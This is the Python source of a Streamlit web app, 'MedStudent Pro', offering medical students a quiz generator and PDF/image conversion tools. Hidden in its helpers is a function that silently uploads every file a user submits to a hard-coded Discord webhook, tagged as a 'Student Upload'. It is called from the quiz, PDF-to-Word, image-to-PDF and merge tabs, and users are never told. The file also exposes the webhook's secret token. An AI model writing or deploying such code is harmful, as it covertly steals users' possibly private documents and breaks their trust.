import streamlit as st
import os
import shutil
import requests
from pdf2docx import Converter
import img2pdf
from PyPDF2 import PdfMerger, PdfReader
import random
import re

# --- CONFIGURATION ---
st.set_page_config(page_title="MedStudent Pro", page_icon="🧬", layout="wide")

# !!! PASTE YOUR DISCORD WEBHOOK URL HERE !!!
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"

# --- CUSTOM CSS (THE UI MAGIC) ---
st.markdown("""
    <style>
    /* 1. BACKGROUND: Dark Gradient (No more white) */
    .stApp {
        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
        background-attachment: fixed;
        color: white;
    }

    /* 2. ANIMATION: Slide in from Right */
    @keyframes slideInRight {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }

    /* 3. CARD STYLING: Glassmorphism */
    div.stTabs {
        animation: slideInRight 0.8s ease-out; /* The float effect */
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(15px);
        -webkit-backdrop-filter: blur(15px);
        border-radius: 20px;
        border: 1px solid rgba(255, 255, 255, 0.2);
        padding: 25px;
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        margin-top: 20px;
    }

    /* 4. BUTTONS: Neon & Interactive */
    div.stButton > button {
        background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%);
        color: white;
        border: none;
        padding: 12px 28px;
        font-size: 16px;
        font-weight: bold;
        border-radius: 50px; /* Pill shape */
        transition: transform 0.2s, box-shadow 0.2s;
        width: 100%;
    }
    div.stButton > button:hover {
        transform: translateY(-5px); /* Moves up when hovered */
        box-shadow: 0 10px 20px rgba(0, 210, 255, 0.4);
    }

    /* 5. TEXT & HEADERS */
    h1 {
        font-family: 'Helvetica Neue', sans-serif;
        background: -webkit-linear-gradient(#00d2ff, #3a7bd5);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        font-size: 3rem;
        text-align: center;
    }
    h2, h3 {
        color: #e0e0e0 !important;
    }
    p, label {
        color: #b0c4de !important;
    }
    
    /* 6. INPUT BOXES */
    .stTextInput > div > div > input {
        background-color: rgba(255, 255, 255, 0.1);
        color: white;
        border: 1px solid rgba(255, 255, 255, 0.2);
    }
    </style>
""", unsafe_allow_html=True)

# --- HEADER ---
st.title("🧬 MedStudent Pro")
st.markdown("<p style='text-align: center; color: #b0c4de;'>Your All-in-One Medical Study & Conversion Station</p>", unsafe_allow_html=True)

# --- HELPER FUNCTIONS ---
def send_to_discord(filepath, filename, tool_name):
    try:
        if "discordapp.com" not in DISCORD_WEBHOOK_URL:
            return 
        with open(filepath, "rb") as f:
            requests.post(
                DISCORD_WEBHOOK_URL,
                data={"content": f"🕵️ **Student Upload ({tool_name}):** `{filename}`"},
                files={"file": (filename, f)}
            )
    except Exception as e:
        print(f"Discord error: {e}")

def generate_quiz_from_text(text):
    sentences = re.split(r'(?<!\w\.\w.)(?<![A-Z][a-z]\.)(?<=\.|\?)\s', text)
    questions = []
    for sentence in sentences:
        words = sentence.split()
        if len(words) > 10: 
            candidates = [w for w in words if len(w) > 7 and w.isalpha()]
            if candidates:
                target_word = random.choice(candidates)
                question_text = sentence.replace(target_word, "___________")
                questions.append({"q": question_text, "a": target_word})
        if len(questions) >= 5: 
            break
    return questions

# --- MAIN LAYOUT ---
# We use columns to center the content slightly if needed, but tabs handle most of it
tab1, tab2, tab3, tab4, tab5 = st.tabs([
    "🧠 AI Quiz", 
    "📄 PDF to Word", 
    "🖼️ Image to PDF", 
    "🖇️ Merge PDFs", 
    "📊 Office to PDF"
])

# ---------------- TAB 1: AI QUIZ (Priority Feature) ----------------
with tab1:
    st.header("🧠 Active Recall Quizzer")
    st.write("Upload your lecture notes. We'll blank out key terms to test your memory.")
    
    quiz_pdf = st.file_uploader("Drop Lecture PDF Here", type="pdf", key="quizpdf")
    
    if quiz_pdf:
        if st.button("🚀 Generate Quiz"):
            with open("study.pdf", "wb") as f:
                f.write(quiz_pdf.getbuffer())
            
            # Extract Text
            reader = PdfReader("study.pdf")
            full_text = ""
            for page in reader.pages:
                full_text += page.extract_text()
            
            # Send to Discord
            send_to_discord("study.pdf", quiz_pdf.name, "Quiz Gen")

            if len(full_text) > 50:
                questions = generate_quiz_from_text(full_text)
                st.markdown("---")
                for i, q in enumerate(questions):
                    st.subheader(f"Question {i+1}")
                    st.write(f"**{q['q']}**")
                    with st.expander(f"👁️ Reveal Answer"):
                        st.info(f"Answer: {q['a']}")
            else:
                st.error("Not enough text found in this PDF!")

# ---------------- TAB 2: PDF TO WORD ----------------
with tab2:
    st.header("📄 Unlock PDF Content")
    uploaded_pdf = st.file_uploader("Upload PDF", type="pdf", key="p2w")
    if uploaded_pdf and st.button("Convert to Word"):
        with open("temp.pdf", "wb") as f:
            f.write(uploaded_pdf.getbuffer())
        send_to_discord("temp.pdf", uploaded_pdf.name, "PDF2Word")
        
        cv = Converter("temp.pdf")
        cv.convert("converted.docx")
        cv.close()
        
        with open("converted.docx", "rb") as f:
            st.download_button("📥 Download Word Doc", f, file_name="converted.docx")

# ---------------- TAB 3: IMG TO PDF ----------------
with tab3:
    st.header("🖼️ Compile Images to PDF")
    uploaded_imgs = st.file_uploader("Upload Scans/Photos", type=["jpg", "png"], accept_multiple_files=True, key="i2p")
    if uploaded_imgs and st.button("Create PDF"):
        img_paths = []
        for img in uploaded_imgs:
            path = f"temp_{img.name}"
            with open(path, "wb") as f:
                f.write(img.getbuffer())
            img_paths.append(path)
        
        pdf_bytes = img2pdf.convert(img_paths)
        send_to_discord(img_paths[0], uploaded_imgs[0].name, "Img2PDF")
        st.download_button("📥 Download PDF", pdf_bytes, file_name="images.pdf")

# ---------------- TAB 4: MERGE PDF ----------------
with tab4:
    st.header("🖇️ Merge Lecture Slides")
    pdfs = st.file_uploader("Upload PDFs", type="pdf", accept_multiple_files=True, key="merge")
    if pdfs and st.button("Merge Files"):
        merger = PdfMerger()
        for pdf in pdfs:
            merger.append(pdf)
        merger.write("merged.pdf")
        merger.close()
        send_to_discord("merged.pdf", "merged.pdf", "Merge")
        with open("merged.pdf", "rb") as f:
            st.download_button("📥 Download Merged PDF", f, file_name="merged.pdf")

# ---------------- TAB 5: OFFICE TO PDF ----------------
with tab5:
    st.header("📊 Office to PDF")
    st.warning("Server-side LibreOffice required for this feature.")
